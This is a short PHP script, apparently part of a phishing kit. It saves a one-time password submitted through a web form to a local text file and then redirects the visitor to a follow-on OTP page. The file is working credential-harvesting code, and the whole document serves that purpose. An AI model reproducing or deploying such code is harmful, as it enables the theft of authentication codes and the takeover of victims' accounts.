<?php
    file_put_contents("code.txt", "$today: " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: otp.new.php');
exit();